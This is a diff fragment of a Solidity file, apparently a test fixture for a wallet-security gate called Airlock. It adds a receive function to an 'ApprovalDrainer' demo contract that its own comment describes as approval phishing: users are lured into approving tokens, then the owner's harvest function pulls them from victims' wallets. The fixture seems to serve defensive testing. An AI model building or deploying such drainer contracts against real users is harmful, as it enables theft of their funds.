@@ -8,6 +8,9 @@ interface IERC20 {
 
 // DEMO ONLY. Approval phishing: tells users to "approve" a token for it, then the owner pulls the approved tokens out of their wallets.
 contract ApprovalDrainer {
+    // Accepts a plain ETH transfer, so the only thing that can stop money reaching this demo contract is Airlock's own gate.
+    receive() external payable {}
+
     address public owner = msg.sender;
 
     function harvest(IERC20 token, address victim) external {
